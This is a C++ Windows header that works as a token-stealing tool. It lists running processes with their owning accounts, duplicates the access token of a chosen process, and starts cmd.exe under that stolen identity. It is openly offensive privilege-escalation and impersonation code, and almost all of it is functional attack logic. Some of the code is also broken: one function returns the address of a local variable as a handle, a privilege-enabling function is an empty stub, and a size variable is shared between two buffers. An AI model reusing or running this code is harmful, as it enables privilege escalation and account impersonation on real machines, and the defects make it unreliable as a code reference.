#pragma once
#include <Windows.h>
#include <TlHelp32.h>
#include <string>

#pragma comment(lib, "advapi32.lib")

void cGetTokenInformation(HANDLE hToken)
{
	DWORD returnLength = 0;
	GetTokenInformation(hToken, TokenUser, nullptr, 0, &returnLength);
	LPVOID lpTokenInfo = NULL;
	lpTokenInfo = LocalAlloc(LMEM_FIXED, returnLength);
	GetTokenInformation(hToken, TokenUser, lpTokenInfo, returnLength, &returnLength);
	constexpr SIZE_T MAX_LEN = 256;
	DWORD dwSize = MAX_LEN;
	wchar_t lpName[MAX_LEN];
	wchar_t lpDomain[MAX_LEN];
	SID_NAME_USE sidType;
	LookupAccountSid(nullptr, ((TOKEN_USER*)lpTokenInfo)->User.Sid, lpName, &dwSize, lpDomain, &dwSize, &sidType);
	wprintf(L"[+] User: %s\\%s\n", lpDomain, lpName);
}

void EnablePrivilege()
{

}

void cCreateProcessWithToken(HANDLE hToken)
{
		LPSTARTUPINFOW sinfo = new STARTUPINFOW();
		sinfo->cb = sizeof(STARTUPINFOW);
		sinfo->dwFlags = STARTF_USESHOWWINDOW;
		sinfo->wShowWindow = 1;
		PPROCESS_INFORMATION pinfo = new PROCESS_INFORMATION();
		wchar_t cmd[] = L"C:\\Windows\\System32\\cmd.exe\0";
		if (!CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, NULL, cmd, NULL, NULL, NULL, sinfo, pinfo))
		{
			printf("[-] CreateProcessWithTokenW error: %d\n", GetLastError());
		}
		printf("[*] PID: %d\n", pinfo->dwProcessId);
}

HANDLE stealingToken(int pid)
{
	printf("[*] stealing token from pid: %d\n", pid);
	HANDLE hProcess;
	HANDLE hToken;
	HANDLE hTokenDup;
	hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid);
	if (hProcess)
	{
		if (OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken))
		{
			if (DuplicateTokenEx(hToken, TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, nullptr, SecurityImpersonation, TokenImpersonation, &hTokenDup))
			{
				cGetTokenInformation(hTokenDup);
				hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid);
				SetThreadToken(nullptr, hTokenDup);	
				cCreateProcessWithToken(hTokenDup);
			}
			else
			{
				printf("[-] error DuplicateTokenEx: %d\n", GetLastError());
				exit(1);
			}
		}
		else 
		{
			printf("[-] error TOKEN_DUPLICATE: %d\n", GetLastError());
			exit(1);
		}
	}
	else
	{
		printf("[-] could not obtain token from pid: %d\n", pid);
	}
	return &hTokenDup;
}

void enumerateProcesses()
{
	printf("[*] starting process enumeration\n");
	HANDLE hProcessSnap;
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		printf("[-] process snapshot could not be created: %d\n", GetLastError());
		exit(1);
	}

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcessSnap, &pe32))
	{
		printf("[-] failed getting first process\n");
		CloseHandle(hProcessSnap);
		exit(1);
	}

	HANDLE hProcess;
	HANDLE hToken;
	do
	{
		hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pe32.th32ProcessID);
		if (hProcess)
		{
			if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
			{
				wprintf(L"[+] %d->%s: ", pe32.th32ProcessID, pe32.szExeFile);
				cGetTokenInformation(hToken);
			}
		}
	} while (Process32Next(hProcessSnap, &pe32));
	CloseHandle(hProcessSnap);
}